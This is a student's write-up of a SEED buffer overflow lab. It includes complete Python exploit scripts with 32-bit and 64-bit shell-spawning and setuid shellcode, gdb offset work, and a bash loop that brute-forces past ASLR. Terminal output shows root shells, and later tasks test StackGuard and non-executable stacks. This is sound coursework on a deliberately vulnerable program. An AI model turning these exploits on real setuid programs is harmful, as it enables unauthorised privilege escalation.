## Lab03 Buffer Overflow Attack Lab
###### Lin Shi (n92s773)
###### linshi1768@gmail.com
###### CSCI 476
###### March 2, 2021
<br>

Before the tasks, I followed the environment setup:
```
[03/01/21]seed@VM:~/.../code$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
[03/01/21]seed@VM:~/.../code$ sudo ln -sf /bin/zsh /bin/sh
```

### Task 1:

#### Task 1.1:
In this task, I compiled and ran both a 32-bit version and a 64-bit version shellcode. I compiled them using the makefile that was given to us. Additionally, I realized that if I compiled using the setuid tag, it will convert both of the executables to be a setuid program; thus running with root privilege:
```
[03/01/21]seed@VM:~/.../shellcode$ make
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
[03/01/21]seed@VM:~/.../shellcode$ ./a32.out
$ whoami
seed
$ exit
[03/01/21]seed@VM:~/.../shellcode$ ./a64.out
$ whoami
seed
$ exit
[03/01/21]seed@VM:~/.../shellcode$ make setuid
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
sudo chown root a32.out a64.out
sudo chmod 4755 a32.out a64.out
[03/01/21]seed@VM:~/.../shellcode$ ./a32.out
# whoami                                                                       
root
# exit
[03/01/21]seed@VM:~/.../shellcode$ ./a64.out
# whoami                                                                       
root
```
In both of the setuid and regular program, the 32 and the 64 bit version will have a shell. However, in the regular program, both the executables are executing as seed, where they are executing as root in the setuid program.

#### Task 1.2:
The main first initialize a blank char array. Then it uses strcpy to copy the appropriate shellcode definition to the variable code. Looking right above the main function, we can see an if statement that splits the 64-bit shellcode with the 32-bit shellcode. Then it invokes the shellcode from the stack, which resulted in our shell. Looking in the makefile, we can see that -m32 flag will make the file a 32-bit binary and without it is 64-bit binary. Overall, the program, more specifically, the main function, calls the appropriate shell with the proper shellcode.

### Task 2:

#### Task 2.1:
Followed the example and see how we could use gdb to find the information we need:
```
[03/01/21]seed@VM:~/.../code$ touch badfile
[03/01/21]seed@VM:~/.../code$ gdb stack-L1-dbg
...
gdb-peda$ b bof
...
gdb-peda$ run
...
gdb-peda$ next
...
gdb-peda$ p $ebp
$1 = (void *) 0xffffcb18
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffcaac
gdb-peda$ p/d 0xffffcb18 - 0xffffcaac
$3 = 108
gdb-peda$ quit
```
We have found our ebp address to be 0xffffcb18, our buffer address to be 0xffffcaac, and offset to be 108. Additionally, we can see our buffer size to be 100.

#### Task 2.2:
First, I added the appropriate shellcode, the 32 bit version from the call_shellcode program. Second, I included the offset and ret values. The variable offset is the difference between the ebp and buffer plus 4 (108 + 4). The return address will be 4 bytes above the current frame pointer; thus, we must adjust it by 4 bytes. The ret will be the ebp address + some delta, with the example being 0x78 during class. However, after a few guess and check, I realized that the delta starts at the buffer size and you may increase it by a little bit (I think the cap depends on the version of the program you have, either 32 or 64). Therefore, I used 120. On the other hand, while I was modifying all these inputs, I realized none of my code worked. While I was searching for help, I saw that the code given to us and the example code Travis showed us was different right around variable "start". Therefore, I changed that portion and kept what I modified for offset, ret, and shellcode, which worked just fine. Thus, I have included the whole program this time so it is clear what I modified:
```
#!/usr/bin/python3
import sys

# TODO: Replace the content with the actual shellcode
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)      # TODO: Change this number
content[start:] = shellcode

# Decide the return address value and put it somewhere in the payload
offset = 112      # TODO: Change this number
ret = 0xffffcb18 + 112 + 100  # TODO: Change this number

L = 4           # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
```
Running the commands.
```
[03/01/21]seed@VM:~/.../code$ rm badfile
[03/01/21]seed@VM:~/.../code$ exploit.py
[03/01/21]seed@VM:~/.../code$ ./stack-L1
Input size: 517
# id                                                                           
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
# whoami                                                                       
root
```
After running the stack (level 1), we can see that we have successfully entered the shell with root effective UID, even though we UID is still seed. However, we are still having the root privilege.


### Task 3:
In this task, we are trying to attack the vulnerable 32-bit program without knowing it buffer size. However, it still means that we could run gdb, but just not using it to derive buffer size.
```
[03/01/21]seed@VM:~/.../code$ gdb stack-L2-dbg
...
gdb-peda$ b bof
...
gdb-peda$ run
...
gdb-peda$ next
...
gdb-peda$ p $ebp
$1 = (void *) 0xffffcb58
gdb-peda$ p &buffer
$2 = (char (*)[160]) 0xffffcab0
gdb-peda$ p/d 0xffffcb58 - 0xffffcab0
$3 = 168
```
I used to gdb to get the offset and ebp value that I will be using for my ret. Then I modified my exploit code. First, I changed the shellcode to the appropriate version. Then I changed the start because of the reason I talked about above. Lastly, I modified offset and ret according to gdb information. However, this time, I tried to fill the most of the NOPs with the correct some return address. Since I discovered in my previous tests that the 32-bit version and 100 buffer space is pretty lenient. On top of that, we know that the buffer size is between 100 and 200, so I decided to set a for loop with size 25 that iterate through while adding 4 to delta each time to cover the memory alignment. Thus, I was able to do a buffer overflow without "knowing" the buffer size.
```
...
shellcode = (
  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

...

# Decide the return address value and put it somewhere in the payload
offset = 172      # TODO: Change this number

  # TODO: Change this number
delta = 100
L = 4           # Use 4 for 32-bit address and 8 for 64-bit address
for i in range(25):
	ret = 0xffffcb58 + 172 + delta
	content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
	delta = delta + 4
##################################################################
...
```
Lastly, we ran the three commands just like above. Removing a badfile, replace it by running exploit.py, and running stack (level 2) against that badfile.
```
[03/02/21]seed@VM:~/.../code$ rm badfile
[03/02/21]seed@VM:~/.../code$ exploit.py
[03/02/21]seed@VM:~/.../code$ ./stack-L2
Input size: 517
# id                                                                           
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
# whoami                                                                       
root
```
As we can see from the solution, we were able to reach the shell successfully. Additionally, the id shows that the real UID is seed but effective UID is root, which means we have root privilege.

### Task 4:
Before completing Task 4, I made /bin/sh point back to /bin/dash instead of /bin/zsh. dash have its countermeasure when they are checking the real UID and effective UID.
```
[03/02/21]seed@VM:~/.../shellcode$ sudo ln -sf /bin/dash /bin/sh
```

#### Task 4.1:
Running the regular program after recompiling:
```
[03/02/21]seed@VM:~/.../shellcode$ make
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
[03/02/21]seed@VM:~/.../shellcode$ ./a32.out
$ whoami
seed
$ id
uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
$ exit
[03/02/21]seed@VM:~/.../shellcode$ ./a64.out
$ id
uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
$ whoami
seed
$ exit
```
Recompiling with setuid target and running this setuid program:
```
[03/02/21]seed@VM:~/.../shellcode$ make setuid
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
sudo chown root a32.out a64.out
sudo chmod 4755 a32.out a64.out
[03/02/21]seed@VM:~/.../shellcode$ ./a32.out
# whoami
root
# id
uid=0(root) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
# exit
[03/02/21]seed@VM:~/.../shellcode$ ./a64.out
# whoami
root
# id
uid=0(root) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
```
The dash's countermeasure is to check the real UID and the effective UID and changing the effective UID if it does not match with the real UID. However, we could get around this easily with a root-owned set-uid program, where our real UID and effective UID are both root. As we can see from the two snippet of code above, we were denied root privilege when we ran the regular program but given root privilege after setuid program.

#### Task 4.2:
This time, we are trying to run the level 1 stack against the dash and try to get around it. Note: In the make file, all levels have been changed to a root-owned, set-uid program with a code like:
```
sudo chown root $@ && sudo chmod 4755 $@
```
Additionally, since this is a set-uid program, we need to modify the shellcode in the exploit.py to match the situation and use gdb to find the information:
```
[03/02/21]seed@VM:~/.../code$ gdb stack-L1-dbg
...
gdb-peda$ b bof
...
gdb-peda$ run
...
gdb-peda$ next
...
gdb-peda$ p $ebp
$1 = (void *) 0xffffcb08
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffca9c
gdb-peda$ p/d 0xffffcb08 - 0xffffca9c
$3 = 108
gdb-peda$ quit
```
Then use the call_shellcode to modify shellcode, use gdb information for offset and ret:
```
...
shellcode = (
    "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')
...

# Decide the return address value and put it somewhere in the payload
offset = 112      # TODO: Change this number
ret = 0xffffcb08 + 120  # TODO: Change this number

L = 4           # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
...
```
Thus, the first ls -l is just demonstrating that stack-L1 is a root-owned set-uid program:
```
[03/02/21]seed@VM:~/.../code$ ls -l
total 216
-rw-rw-r-- 1 seed seed   517 Mar  2 01:25 badfile
-rwxr-xr-x 1 seed seed   276 Feb 27 19:47 brute-force.sh
-rwxr-xr-x 1 seed seed  1017 Mar  2 01:48 exploit.py
-rw-rw-r-- 1 seed seed  1530 Mar  2 01:16 Makefile
-rw-rw-r-- 1 seed seed    11 Mar  1 19:36 peda-session-stack-L1-dbg.txt
-rw-rw-r-- 1 seed seed    11 Mar  2 01:16 peda-session-stack-L2-dbg.txt
-rwsr-xr-x 1 root seed 15908 Mar  1 12:56 stack
-rw-rw-r-- 1 seed seed  1096 Feb 27 19:47 stack.c
-rwsr-xr-x 1 root seed 15908 Mar  1 12:58 stack-L1
-rwxrwxr-x 1 seed seed 18688 Mar  1 12:58 stack-L1-dbg
-rwsr-xr-x 1 root seed 15908 Mar  2 01:06 stack-L2
-rwxrwxr-x 1 seed seed 18688 Mar  2 01:06 stack-L2-dbg
-rwsr-xr-x 1 root seed 17112 Mar  1 12:58 stack-L3
-rwxrwxr-x 1 seed seed 20112 Mar  1 12:58 stack-L3-dbg
-rwsr-xr-x 1 root seed 17112 Mar  1 12:58 stack-L4
-rwxrwxr-x 1 seed seed 20112 Mar  1 12:58 stack-L4-dbg
-rwsr-xr-x 1 root seed 17112 Mar  1 19:47 stackTest
[03/02/21]seed@VM:~/.../code$ rm badfile
[03/02/21]seed@VM:~/.../code$ exploit.py
[03/02/21]seed@VM:~/.../code$ ./stack-L1
Input size: 517
# whoami
root
# id
uid=0(root) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
# exit
[03/02/21]seed@VM:~/.../code$ ls -l /bin/sh /bin/zsh /bin/dash
-rwxr-xr-x 1 root root 129816 Jul 18  2019 /bin/dash
lrwxrwxrwx 1 root root      9 Mar  2 01:30 /bin/sh -> /bin/dash
-rwxr-xr-x 1 root root 878288 Feb 23  2020 /bin/zsh
[03/02/21]seed@VM:~/.../code$ id
uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
```
After demonstrating the privilege and owner of stack-L1, I ran the program just like before: removing the badfile, replacing it with a file created by exploit.py, and run stack against that badfile. In this case, I still had a root privilege shell. Then I checked the /bin/sh and that is pointing to /bin/dash and our id is still seed. Based on the little experiment we did in Task 4.1, we could see that the real UID and the effective UID has been the same, so dash treated us as the root user. Therefore, I can conclude that running a root-owned set-uid program could get around a program with buffer-overflow vulnerability and protect it with only the dash's countermeasure.

### Task 5:
In this Task, we are trying another countermeasure against buffer overflow, the ASLR. In the beginning of the lab, I have turned the feature off to ensure our "hacking" will continue smoothly. However, that does not mimic the real life situation and I will experimenting with that feature turned on.


#### Task 5.1:
Turn the feature on and run stack-L1 against it.
```
[03/02/21]seed@VM:~/.../code$ sudo /sbin/sysctl -w kernel.randomize_va_space=2
[03/02/21]seed@VM:~/.../code$ rm badfile
[03/02/21]seed@VM:~/.../code$ exploit.py
[03/02/21]seed@VM:~/.../code$ ./stack-L1
Input size: 517
Segmentation fault
```
We could see that with ASLR turned on, we have received a segmentation fault. Since in a 32-bit machine, the stack contains only 19 bits of entropy, which means base address for the stack can have only 524,288 possibilities, with today's machine, we could try to brute-force it and break through the ASLR protected program. On the other hand, since we only ran the program once in this task, it would be extremely unlikely for us to break in right away. Therefore, it is not a surprise that we had a segmentation fault.

#### Task 5.2:
In this task, we are brute-forcing to defeat the ASLR feature. We are using a program that is provided to us, brute-force.sh:
```
#!/bin/bash

SECONDS=0
value=0

while true; do
    value=$(( $value + 1 ))
    duration=$SECONDS
    min=$(($duration / 60))
    sec=$(($duration % 60))
    echo "The program has been run $value times so far (time elapsed: $min minutes and $sec seconds)."
    ./stack-L1
done
```
Note: the exploit.py is the previous one that just runs stack-L1:
```
[03/02/21]seed@VM:~/.../code$ rm badfile
rm: cannot remove 'badfile': No such file or directory
[03/02/21]seed@VM:~/.../code$ exploit.py
[03/02/21]seed@VM:~/.../code$ ./brute-force.sh
...
./brute-force.sh: line 13: 756850 Segmentation fault      ./stack-L1
The program has been run 32688 times so far (time elapsed: 0 minutes and 24 seconds).
Input size: 517
# whoami
root
# id
uid=0(root) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
```
After 32,688 runs and 24 seconds, we have successfully defeated the ASLR feature. With enough time and luck, we are able to get passed ASLR with brute-force.


### Task 6:

#### Task 6.1:
In this task, we are testing other countermeasures. For example stackGuard, it is turned on by default (unless you are using gcc versions that are lower that 4.3.3). We have been turning it off on purpose with -fno-stack-protector. This time we will mess around with this countermeasure:
```
[03/02/21]seed@VM:~/.../code$ sudo /sbin/sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
[03/02/21]seed@VM:~/.../code$ gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -o stack-L1 stack.c
[03/02/21]seed@VM:~/.../code$ rm badfile
[03/02/21]seed@VM:~/.../code$ exploit.py
[03/02/21]seed@VM:~/.../code$ ./stack-L1
Input size: 517
$ whoami
seed
$ exit
[03/02/21]seed@VM:~/.../code$ sudo chown root stack-L1
[03/02/21]seed@VM:~/.../code$ sudo chmod 4755 stack-L1
[03/02/21]seed@VM:~/.../code$ rm badfile
[03/02/21]seed@VM:~/.../code$ exploit.py
[03/02/21]seed@VM:~/.../code$ ./stack-L1
Input size: 517
# whoami
root
# id
uid=0(root) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
# exit
```
We will then run the program with stackGuard turned on:
```
[03/02/21]seed@VM:~/.../code$ gcc -DBUF_SIZE=100 -z execstack -m32 -o stack-L1 stack.c
[03/02/21]seed@VM:~/.../code$ sudo chown root stack-L1
[03/02/21]seed@VM:~/.../code$ sudo chmod 4755 stack-L1
[03/02/21]seed@VM:~/.../code$ rm badfile
[03/02/21]seed@VM:~/.../code$ exploit.py
[03/02/21]seed@VM:~/.../code$ ./stack-L1
Input size: 517
*** stack smashing detected ***: terminated
Aborted
```
This time, we experienced a stack smashing detected and our program is aborted. Since the stackGuard is like a check between the buffer and return address, when the value changed, the program will stop. Thus, protecting the program from buffer overflow.

#### Task 6.2:
In this task, we will turn on the non-executable stack protection by taking off the -z execstack option for both 32-bit and 64-bit versions:
```
[03/02/21]seed@VM:~/.../shellcode$ gcc -m32 -o a32.out call_shellcode.c
[03/02/21]seed@VM:~/.../shellcode$ sudo chown root a32.out a64.out
[03/02/21]seed@VM:~/.../shellcode$ sudo chmod 4755 a32.out a64.out
[03/02/21]seed@VM:~/.../shellcode$ ./a32.out
Segmentation fault
```
```
[03/02/21]seed@VM:~/.../shellcode$ gcc -o a64.out call_shellcode.c
[03/02/21]seed@VM:~/.../shellcode$ sudo chown root a32.out a64.out
[03/02/21]seed@VM:~/.../shellcode$ sudo chmod 4755 a32.out a64.out
[03/02/21]seed@VM:~/.../shellcode$ ./a64.out
Segmentation fault
```
As we can see, both of the files experience a segmentation fault as a result of non-executable stack protection. Making the stack non-executable will prevent jumping to the shellcode that we wanted to insert. However, if we run a return-to-libc-attack, it sounds like we would accomplish this by returning to the system() libc function. Where it will execute system("/bin/sh"). I do not know if this will work at all, I simply read the instruction to the return-to-libc attack lab provided in the writeup and made a guess at the solution.

### Task 8:
In this task, we are trying to attack a vulnerable 64-bit program. First, we use the gdb to determine the rbp, buffer, and offset.
```
[03/02/21]seed@VM:~/.../code$ touch badfile
[03/02/21]seed@VM:~/.../code$ gdb stack-L4-dbg
...
gdb-peda$ b bof
...
gdb-peda$ run
...
gdb-peda$ next
...
gdb-peda$ p $rbp
$1 = (void *) 0x7fffffffd950
gdb-peda$ p &buffer
$2 = (char (*)[10]) 0x7fffffffd946
gdb-peda$ p/d 0x7fffffffd950 - 0x7fffffffd946
$3 = 10
```
Then, with the information, I tested a few options, but I was not getting anywhere (Mainly because I am unsure how 64 bit programs are going to act). Then, since brute-force was not eliminated, I chose to brute-force it and changed the program that was given to use to better match my situation. Doing the remove the badfile, running the exploit.py by passing in the number as the offset, and run the stack against the badfile. Through this, I was able to find my offset that worked. I named it test-brute-force.sh:
```
#!/bin/bash

SECONDS=0
value=0
number=23

while true; do
    value=$(( $value + 1 ))
    duration=$SECONDS
    min=$(($duration / 60))
    sec=$(($duration % 60))
    number=$(( $number +1))
    echo "The program has been run $value times so far (time elapsed: $min minutes and $sec seconds)."
    rm badfile
    python3 exploit.py $number
    ./stack-L4
done
```
The exploit.py file that I changed to help me brute-force to help the delta number. First, I changed the shellcode to be a set-uid 64-bit shellcode (from call_shellcode). Then, from the gdb, we found the offset to be 18. Next, we use sys.argv[1] to get the command line value and since it was having an issue with adding to return address, I cast it to float, then to int to get rid of the error.
```
#!/usr/bin/python3
import sys

# TODO: Replace the content with the actual shellcode
shellcode = (
"\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')
...

# Decide the return address value and put it somewhere in the payload
offset = 18      # TODO: Change this number
print("delta", sys.argv[1])
ret = 0x7fffffffd990 + offset + int(float(sys.argv[1]))  # TODO: Change this number

L = 8           # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
...
```
```
[03/02/21]seed@VM:~/.../code$ ./test-brute-force.sh
...
delta 1044
Input size: 517
./test-brute-force.sh: line 20:  8698 Segmentation fault      ./stack-L4
The program has been run 1022 times so far (time elapsed: 0 minutes and 12 seconds).
delta 1045
Input size: 517
./test-brute-force.sh: line 20:  8703 Segmentation fault      ./stack-L4
The program has been run 1023 times so far (time elapsed: 0 minutes and 12 seconds).
delta 1046
Input size: 517
# whoami
root
# id
uid=0(root) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
#
```
In the end, I found the number to be 1046 as delta, which was **way** bigger than I expected. Then given a second thought, since this is a 64-bit version, it may be different than 32-bit version. Based on the output, we could see that I am running a shell with root privilege. Proving that 64-bit programs are harder to hack, but not impossible.
